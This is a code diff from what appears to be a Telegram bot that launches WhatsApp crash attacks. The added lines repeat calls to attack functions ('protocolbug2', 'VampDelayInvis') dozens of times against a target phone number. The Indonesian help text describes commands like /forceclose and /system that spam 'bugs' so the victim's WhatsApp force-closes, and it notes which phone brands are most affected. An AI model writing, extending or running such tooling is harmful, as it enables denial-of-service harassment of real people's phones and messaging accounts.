+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
         await FlowX(formatedNumber);
     }
 
@@ -2082,7 +2615,7 @@ bot.onText(/\/forceclose(?:\s(.+))?/, async (msg, match) => {
 ┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
 ┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
 ┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
-┃〢 Cᴏᴍᴍᴀɴᴅ : /system
+┃〢 Cᴏᴍᴍᴀɴᴅ : /force x delay 
 ┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 10 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
@@ -2400,9 +2933,9 @@ bot.on("callback_query", async (callbackQuery) => {
 ▢ /forceclose 628xxx
 ╰➤ Bug ini akan melakukan spam bug kepada target setiap kali bug masuk maka target akan force close (keluar dari wa) kekurangan bug ini target dapat melihat nomor bot yg mengirimkan bug dan bisa saja diblokir 
 
-#- RanzBugFrezechat
-▢ /frezechat 628xxx
-╰➤ Bug ini sama seperti delaymention bedanya bug ini melakukan bug langsung kepada target, berbeda dengan delaymention yg melakukan bug melalui sw. target akan ditag di sw bug tersebut 
+#- RanzBugSystem
+▢ /system 628xxx
+╰➤ Baca baik-baik, bug system ini tidak work di semua Android, hanya di HP tertentu. Yang paling bereaksi terhadap bug system ini adalah device HP China seperti Xiaomi, Redmi, Poco, Infinix, dll.
 
 #- RanzBugIOS
 ▢ /bakios 628xxx
